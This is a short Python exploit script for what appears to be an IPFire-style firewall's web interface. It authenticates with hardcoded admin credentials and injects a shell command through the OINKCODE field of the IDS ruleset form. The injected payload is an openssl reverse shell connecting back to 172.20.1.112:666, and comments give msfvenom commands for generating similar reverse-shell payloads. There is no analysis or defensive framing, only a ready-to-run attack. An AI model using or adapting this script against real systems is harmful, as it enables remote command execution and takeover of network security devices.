import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ip = '172.16.1.155'
user = 'admin'
password = '1pF1@dm#2020'
port = 444
lport = 666
lhost = '172.20.1.112'

r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, password), verify=False)

print("Check: " + str(r.status_code))

#msfvenom -p cmd/unix/reverse_perl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
#msfvenom -p cmd/unix/reverse_openssl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
payload = "`sh -c '(sleep 3643|openssl s_client -quiet -connect 172.20.1.112:666|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 172.20.1.112:666 >/dev/null 2>&1 &)'`"

data = {
            "ENABLE_SNORT_GREEN": "on",
            "ENABLE_SNORT": "on",
            "RULES": "registered",
            "OINKCODE": payload,
            "ACTION": "Download new ruleset",
            "ACTION2": "snort"
        }

r_exploit = requests.post(
    f'https://{ip}:{port}/cgi-bin/ids.cgi',
    auth=(user, password),
    verify=False,
    headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'},
    data = data
    )


print(r_exploit)